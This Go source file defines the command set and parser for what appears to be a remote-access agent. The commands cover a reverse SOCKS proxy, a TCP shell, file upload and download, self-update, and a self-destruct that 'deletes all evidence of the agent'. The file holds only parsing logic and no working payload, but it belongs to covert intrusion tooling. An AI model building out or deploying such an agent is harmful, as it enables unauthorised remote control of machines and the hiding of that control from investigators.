package commands

import (
	"errors"
	"strings"
)

type Command uint8

const (
	_ = iota // We don't want 0 values
	// Uses the relay to create a reverse socks connection
	Socks5
	// Creates a pseudo-terminal and connects stdin, stdout, and stderr to the net.Conn
	ShellTCP
	// Deletes all evidence of the agent
	SelfDestruct
	// Reads the file path (addr) and sends the contents
	SendFile
	// Reads data from net.Conn and writes it to the file path (addr)
	ReceiveFile
	// Updates the agent with a new server device ID
	UpdateID
	// Replaces the agent with a new binary and restarts it
	UpdateBinary

	Exit // Marks the end of the command list
)

type CommandStruct struct {
	Command   Command
	Arguments []string
}

func ParseCommand(line string) (*CommandStruct, error) {
	cs := CommandStruct{}
	// Split by space
	arg := strings.Split(line, " ")
	if len(arg) < 1 {
		return nil, errors.New("empty string")
	}
	switch arg[0] {
	case "socks":
		cs.Command = Socks5
	case "sh":
		cs.Command = ShellTCP
	case "kill":
		cs.Command = SelfDestruct
	case "send":
		cs.Command = SendFile
		if len(arg) != 3 {
			return nil, errors.New("send: <local> <remote>")
		}
		cs.Arguments = append(cs.Arguments, arg[1], arg[2])
	case "recv":
		cs.Command = ReceiveFile
		if len(arg) != 3 {
			return nil, errors.New("recv: <remote> <local>")
		}
		cs.Arguments = append(cs.Arguments, arg[1], arg[2])
	case "updateid":
		cs.Command = UpdateID
		if len(arg) != 2 {
			return nil, errors.New("updateid: <newid>")
		}
		cs.Arguments = append(cs.Arguments, arg[1])
	case "update":
		cs.Command = UpdateBinary
		if len(arg) != 2 {
			return nil, errors.New("update: <local>")
		}
		cs.Arguments = append(cs.Arguments, arg[1])
	default:
		return nil, errors.New("unknown command")
	}
	return &cs, nil
}
